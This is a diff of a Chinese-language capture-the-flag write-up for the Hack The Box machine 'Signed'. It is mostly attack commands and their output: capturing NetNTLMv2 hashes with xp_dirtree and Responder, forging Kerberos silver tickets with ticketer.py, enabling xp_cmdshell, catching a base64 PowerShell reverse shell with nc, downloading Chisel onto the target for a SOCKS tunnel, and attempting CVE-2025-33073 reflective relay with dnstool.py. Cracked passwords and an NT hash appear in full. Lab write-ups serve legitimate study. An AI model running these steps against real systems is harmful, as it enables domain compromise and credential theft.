@@ -8,8 +8,14 @@
 [★]$ netexec mssql 10.129.242.173 -u scott -p 'Sm230#C5NatH' --local-auth //[+] DC01\scott:Sm230#C5NatH 
 [★]$ mssqlclient.py scott:'Sm230#C5NatH'@dc01.signed.htb
 ————————————————————————————————————————————————————————————————
-[1] 得到破解 NetNTLMv2 --> MSSQLSVC purPLE9795!@
-[★]$ sudo responder -I tun0
+[1]尝试列出主机上 SMB 共享中的目录：
+
+SQL (scott  guest@master)> xp_dirtree \\10.10.15.139\share
+subdirectory   depth   file   
+------------   -----   ----   
+SQL (scott  guest@master)>
+
+[★]$ sudo responder -I tun0 //得到破解 NetNTLMv2 --> MSSQLSVC purPLE9795!@
                                          __
   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
   |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
@@ -18,15 +24,28 @@
 
            NBT-NS, LLMNR & MDNS Responder 3.1.3.0
 
-//尝试列出主机上 SMB 共享中的目录：
-SQL (scott  guest@master)> xp_dirtree \\10.10.15.139\share
-subdirectory   depth   file   
-------------   -----   ----   
-SQL (scott  guest@master)>
+
 ————————————————————————————————————————————————————————————————
 [2][★]$ mssqlclient.py mssqlsvc:'purPLE9795!@'@DC01.signed.htb -windows-auth
 
-SQL (SIGNED\mssqlsvc  guest@master)> 
+SQL (SIGNED\mssqlsvc  guest@master)>
+
+
+[3]将使用 Impacket 连接mssqlclient.py到MSSQL
+
+[★]$ mssqlclient.py scott:'Sm230#C5NatH'@dc01.signed.htb
+
+SQL (scott  guest@master)> select @@version;  //全局变量@@version显示版本信息
+————————————————————————————————————————————————————————————————
+//SIGNED\mssqlsvc  dbo@master --> -user-id 1103 -groups '512,1105' doesntmatter
+
+[★]$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -user-id 1103 -groups '512,1105' doesntmatter
+[★]$ KRB5CCNAME=doesntmatter.ccache mssqlclient.py -no-pass -k DC01.signed.htb
+SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell whoami
+output            
+---------------   
+signed\mssqlsvc   
+————————————————————————————————————————————————————————————————
 ```
 
 </details>
@@ -680,88 +699,6 @@ PS C:\SQL2022> ls
 PS C:\SQL2022> cd ..                                
 ```
 #### inetpub它为空，SQL2022看起来也为空（实际上只是 mssqlsvc 无法访问，而且它也没什么用）。没有任何值得关注的安装程序
-### Tunnel
-#### 对于某些升级方法，通过本地主机使用代理来访问除 1433 端口之外的其他端口会很有用。我会上传Chisel：
-https://github.com/jpillora/chisel/releases/tag/v1.11.5
-```
-[★]$ unzip  chisel_1.11.5_windows_amd64.zip 
-Archive:  chisel_1.11.5_windows_amd64.zip
-  inflating: chisel.exe
-[★]$ python3 -m http.server 8011
-Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...
-```
-```
-PS C:\programdata> iwr http://10.10.15.139:8011/chisel.exe -o chisel.exe
-```
-#### 将在我的主机上启动服务器./chisel_1.10.0_linux_amd64 server --reverse -p 8000并连接：
-```
-[★]$ gunzip chisel_1.11.5_linux_amd64.gz
-[★]$ chmod +x chisel_1.11.5_linux_amd64
-[★]$ ./chisel_1.11.5_linux_amd64 server --reverse -p 8000
-2026/03/21 01:57:35 server: Reverse tunnelling enabled
-2026/03/21 01:57:35 server: Fingerprint YLw4tLKGcBvnPyuVUyotISg1fXwso5zBwe7bhBW5tpw=
-2026/03/21 01:57:35 server: Listening on http://0.0.0.0:8000
-
-
-```
-#### 运行
-```
-PS C:\programdata> .\chisel.exe client 10.10.15.139:8000 R:socks
-```
-#### 程序卡住了，但服务器端连接正常：
-```
-[★]$ ./chisel_1.11.5_linux_amd64 server --reverse -p 8000
-2026/03/21 01:57:35 server: Reverse tunnelling enabled
-2026/03/21 01:57:35 server: Fingerprint YLw4tLKGcBvnPyuVUyotISg1fXwso5zBwe7bhBW5tpw=
-2026/03/21 01:57:35 server: Listening on http://0.0.0.0:8000
-2026/03/21 01:58:47 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
-```
-| 类型     | 能不能用         |
-| ------ | ------------ |
-| socks5 | ✅ 推荐（必须优先）   |
-| socks4 | ⚠️ 有时能用，但不稳定 |
-```
-[★]$ sudo vi /etc/proxychains.conf
-[★]$ tail -n 6 /etc/proxychains.conf
-[ProxyList]
-# add proxy here ...
-# meanwile
-# defaults set to "tor"
-socks5 	127.0.0.1 1080
-```
-#### 现在我可以访问其他端口，例如 SMB 端口：
-```
-[★]$ sudo proxychains netexec smb 127.0.0.1
-[proxychains] config file found: /etc/proxychains.conf
-[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
-[proxychains] DLL init: proxychains-ng 4.16
-[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:445  ...  OK
-[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:445  ...  OK
-[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:135  ...  OK
-SMB         127.0.0.1       445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:SIGNED.HTB) (signing:True) (SMBv1:False)
-```
-### 0xdf 将展示三种在已签名系统上获取管理员或 SYSTEM 权限的方法：
-```
---intended-->
-..unintended..>
-
-//利用 MSSQL 的文件读取 + 模拟权限 → 直接越权读 root.txt
-mssqlsvc Password ..> OPENROWSET BULK Impersonation ..> Read as any Group ..> root.txt
-//MSSQL 读凭据 → 横向登录 WinRM → 拿管理员 shell
-mssqlsvc Password ..> OPENROWSET BULK Impersonation ..> Read as any Group ..> Administrator Password ..> WinRM over Chisel Tunnel ..> Shell as Administrator --> root.txt
-
-//利用 NTLM 认证机制漏洞 → 中继成管理员
-mssqlsvc Password --> shell as mssqlsvc --> Chisel Scoks --> NTLM Relay --> ntlmrelayx WinRm --> Shell as Administrator --> root.txt
-
-//拿 token + Potato → 本地提权 SYSTEM
-mssqlsvc Password --> Shell as mssqlsvc ..> Recover Network Logon Token ..> GodPotato ..> Shell as SYSTEM ..> root.txt
-```
-| 路线             | 本质        |
-| -------------- | --------- |
-| OPENROWSET 读文件 | 权限滥用（最直接） |
-| 读密码 + WinRM    | 横向移动      |
-| NTLM Relay     | 协议攻击      |
-| GodPotato      | 本地提权      |
 ### [1]via OPENROWSET BULK Impersonation | File Read
 #### 将在ticketer.py通话中添加两个选项：
 #### -user-id 1103- 强制用户 ID 为 mssqlsvc。
@@ -855,75 +792,88 @@ BulkColumn
 ---------------------------------------   
 b'cbfcf88****************************\r\n'   
 ```
-### [2]Shell
+
+<details>
+<summary>结束 其他不行</summary>
+	
+### 0xdf 将展示三种在已签名系统上获取管理员或 SYSTEM 权限的方法：
+```
+--intended-->
+..unintended..>
+
+//利用 MSSQL 的文件读取 + 模拟权限 → 直接越权读 root.txt
+mssqlsvc Password ..> OPENROWSET BULK Impersonation ..> Read as any Group ..> root.txt
+//MSSQL 读凭据 → 横向登录 WinRM → 拿管理员 shell
+mssqlsvc Password ..> OPENROWSET BULK Impersonation ..> Read as any Group ..> Administrator Password ..> WinRM over Chisel Tunnel ..> Shell as Administrator --> root.txt
+
+//利用 NTLM 认证机制漏洞 → 中继成管理员
+mssqlsvc Password --> shell as mssqlsvc --> Chisel Scoks --> NTLM Relay --> ntlmrelayx WinRm --> Shell as Administrator --> root.txt
+
+//拿 token + Potato → 本地提权 SYSTEM
+mssqlsvc Password --> Shell as mssqlsvc ..> Recover Network Logon Token ..> GodPotato ..> Shell as SYSTEM ..> root.txt
+```
+| 路线             | 本质        |
+| -------------- | --------- |
+| OPENROWSET 读文件 | 权限滥用（最直接） |
+| 读密码 + WinRM    | 横向移动      |
+| NTLM Relay     | 协议攻击      |
+| GodPotato      | 本地提权      |
+### [2]Shell -- 文件打不开
 #### 管理员的 PowerShell 历史记录文件是一个值得阅读的文件：
 ```
 SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt', SINGLE_CLOB) AS Contents;
 ERROR(DC01): Line 1: Cannot bulk load. The file "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" does not exist or you don't have file access rights.
 ```
-______________________________________方向错了
-#### SIGNED\Administrator  dbo@master --> -groups 1105 Administrator
-```
-[★]$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 1105 Administrator
-[★]$ KRB5CCNAME=Administrator.ccache mssqlclient.py -no-pass -k  DC01.signed.htb
-SQL (SIGNED\Administrator  dbo@master)> enable_xp_cmdshell
-INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
-INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
-
-SQL (SIGNED\Administrator  dbo@master)> xp_cmdshell "PowerShell #5 (stderr support)(Base64)" //revshell.com
-
-[★]$ sudo nc -lvnp 443
-listening on [any] 443 ...
-connect to [10.10.15.139] from (UNKNOWN) [10.129.8.38] 65101
-whoami
-signed\mssqlsvc
-```
-#### SIGNED\mssqlsvc  dbo@master --> -user-id 1103 -groups '512,1105' doesntmatter
-```
-[★]$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -user-id 1103 -groups '512,1105' doesntmatter
-[★]$ KRB5CCNAME=doesntmatter.ccache mssqlclient.py -no-pass -k DC01.signed.htb
-SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell whoami
-output            
----------------   
-signed\mssqlsvc   
-
-NULL
-```
-#### SIGNED\mssqlsvc  dbo@master --> -groups 1105 -user-id 1103 mssqlsvc
-```
-[★]$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 1105 -user-id 1103 mssqlsvc
-[★]$ KRB5CCNAME=mssqlsvc.ccache mssqlclient.py -no-pass -k DC01.signed.htb
-
-SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell whoami
-output            
----------------   
-signed\mssqlsvc   
-
-NULL              
-```
 ______________________________________
-#### SIGNED\mssqlsvc  dbo@master --> -user-id 1103 -groups '512,1105' doesntmatter
+### 【3】Tunnel -- 行不通| proxychains版本更新'coerce_plus'不存在
+#### 对于某些升级方法，通过本地主机使用代理来访问除 1433 端口之外的其他端口会很有用。我会上传Chisel：
+https://github.com/jpillora/chisel/releases/tag/v1.11.5
 ```
-SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell "powershell -e JABF..."
+[★]$ unzip  chisel_1.11.5_windows_amd64.zip 
+Archive:  chisel_1.11.5_windows_amd64.zip
+  inflating: chisel.exe
+[★]$ python3 -m http.server 8011
+Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...
 ```
 ```
- [★]$ sudo nc -lvnp 443
-listening on [any] 443 ...
-connect to [10.10.15.139] from (UNKNOWN) [10.129.8.38] 52688
-whoami 
-signed\mssqlsvc
-PS C:\Windows\system32> cd ..\..\programdata
 PS C:\programdata> iwr http://10.10.15.139:8011/chisel.exe -o chisel.exe
+```
+#### 将在我的主机上启动服务器./chisel_1.10.0_linux_amd64 server --reverse -p 8000并连接：
+```
+[★]$ wget https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_linux_amd64.gz
+[★]$ gunzip chisel_1.11.5_linux_amd64.gz
+[★]$ chmod +x chisel_1.11.5_linux_amd64
+[★]$ ./chisel_1.11.5_linux_amd64 server --reverse -p 8000
+2026/03/21 01:57:35 server: Reverse tunnelling enabled
+2026/03/21 01:57:35 server: Fingerprint YLw4tLKGcBvnPyuVUyotISg1fXwso5zBwe7bhBW5tpw=
+2026/03/21 01:57:35 server: Listening on http://0.0.0.0:8000
+
+
+```
+#### 运行
+```
+//SIGNED\mssqlsvc  dbo@master --> -user-id 1103 -groups '512,1105' doesntmatter
 PS C:\programdata> .\chisel.exe client 10.10.15.139:8000 R:socks
 ```
+#### 程序卡住了，但服务器端连接正常：
 ```
 [★]$ ./chisel_1.11.5_linux_amd64 server --reverse -p 8000
-2026/03/22 02:53:35 server: Reverse tunnelling enabled
-2026/03/22 02:53:35 server: Fingerprint Zs1rQra2VE9MoXS9ICEEytuDYui5xq/I9fCTJcgdf8k=
-2026/03/22 02:53:35 server: Listening on http://0.0.0.0:8000
-2026/03/22 02:55:25 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
-
+2026/03/21 01:57:35 server: Reverse tunnelling enabled
+2026/03/21 01:57:35 server: Fingerprint YLw4tLKGcBvnPyuVUyotISg1fXwso5zBwe7bhBW5tpw=
+2026/03/21 01:57:35 server: Listening on http://0.0.0.0:8000
+2026/03/21 01:58:47 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
 ```
+#### 修改设置
+```
+[★]$ sudo vi /etc/proxychains.conf
+[★]$ tail -n 6 /etc/proxychains.conf
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5 	127.0.0.1 1080
+```
+#### 现在我可以访问其他端口，例如 SMB 端口：
 ```
 [★]$ sudo proxychains netexec smb 127.0.0.1
 [proxychains] config file found: /etc/proxychains.conf
@@ -934,6 +884,7 @@ PS C:\programdata> .\chisel.exe client 10.10.15.139:8000 R:socks
 [proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:135  ...  OK
 SMB         127.0.0.1       445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:SIGNED.HTB) (signing:True) (SMBv1:False)
 ```
+#### 445端口 = SMB（Windows文件共享 + 域通信核心端口）
 ```
 [★]$ proxychains nc -zv 10.129.8.38 445
 [proxychains] config file found: /etc/proxychains.conf
@@ -943,6 +894,16 @@ SMB         127.0.0.1       445    DC01             [*] Windows 10 / Server 2019
 10.129.8.38 [10.129.8.38] 445 (microsoft-ds) open : Operation now in progress
 
 ```
+#### 搜索：CVE-2025-33073
+https://www.synacktiv.com/sites/default/files/2025-06/x33fcon-reflective_relay-cve-2025-33073.pdf
+#### 在 PDF 里看到的奇怪字符串：构造的特殊 DNS 名（marshalled structure）
+```
+Doing some Kerberos relay research
+Kerberos relaying has already been shown by James Forshaw
+Coerce the target using a specific DNS record (marshalled structure)
+<target>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
+```
+#### 用来欺骗 Windows：“这是本地认证 → 触发 NTLM local auth → SYSTEM token”
 #### 搜索：krbrelays github
 ```
 [★]$ git clone https://github.com/dirkjanm/krbrelayx
@@ -960,18 +921,16 @@ addspn.py  dnstool.py  krbrelayx.py  lib  LICENSE  printerbug.py  README.md
 [★]$ source .venv/bin/activate
 (.venv) [~/krbrelayx][★]$ pip3 install impacket
 (.venv) [~/krbrelayx][★]$ pip3 install pycryptodome
-(.venv) [~/krbrelayx][★]$ python3 dnstool.py -u 'SIGNED\MSSQLSVC' -p 'purPLE9795!@' -a add -r dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 10.10.15.139 10.129.8.38
+(.venv) [~/krbrelayx][★]$ python3 dnstool.py -u 'SIGNED\MSSQLSVC' -p 'purPLE9795!@' -a add -r dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 10.10.15.139 10.129.242.173
+//不行
+(.venv) [★]$  proxychains nxc smb dc01.signed.htb -u mssqlsvc -p 'purPLE9795!@' -M coerce_plus --options
+(.venv) [★]$ proxychains nxc smb dc01.signed.htb -u mssqlsvc -p 'purPLE9795!@' -M coerce_plus -o L=dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA M=Petitpotam
+[proxychains] config file found: /etc/proxychains.conf
+ [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+ usage: nxc [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION ...]] [-L]
+ [--options]
+ nxc: error: argument -M/--module: invalid choice: 'coerce_plus'
+</SNIP> //版本更新'coerce_plus'不存在
+```
 
-
-```
-https://app.hackthebox.com/machines/Signed?sort_by=created_at&sort_type=desc
-#### 搜索：CVE-2025-33073
-https://www.synacktiv.com/sites/default/files/2025-06/x33fcon-reflective_relay-cve-2025-33073.pdf
-#### 在 PDF 里看到的奇怪字符串：构造的特殊 DNS 名（marshalled structure）
-```
-Doing some Kerberos relay research
-Kerberos relaying has already been shown by James Forshaw
-Coerce the target using a specific DNS record (marshalled structure)
-<target>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
-```
-#### 用来欺骗 Windows：“这是本地认证 → 触发 NTLM local auth → SYSTEM token”
+</details>
